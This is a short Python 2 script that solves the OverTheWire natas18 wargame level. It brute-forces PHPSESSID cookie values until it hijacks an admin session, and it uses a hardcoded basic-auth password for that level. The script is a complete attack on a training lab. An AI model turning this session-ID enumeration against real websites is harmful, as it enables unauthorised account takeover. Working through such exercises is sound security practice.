from StringIO import StringIO
import pycurl
import re
import sys

def check_integer(i):
	# init curl instance.
	c = pycurl.Curl()

	# set curl options
	c.setopt(c.URL, 'http://natas18.natas.labs.overthewire.org/index.php')
	c.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
	c.setopt(pycurl.USERPWD, "%s:%s" % ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'))
	c.setopt(pycurl.COOKIE, "PHPSESSID=%d" % i)

	# set buffer for data
	buffer = StringIO()
	c.setopt(c.WRITEDATA, buffer)

	# execute
	c.perform()
	c.close()

	# retrieve content from buffer.
	body = buffer.getvalue()

	# do stuff.
	if re.search('Login as an admin', body) is None:
		print body
		return True

	return False

# our loop
for num in range(40,50):
	sys.stdout.write('\rTrying %d' % num)
	sys.stdout.flush()
	if check_integer(num): break

print "\n"
print num

print "[DONE!]"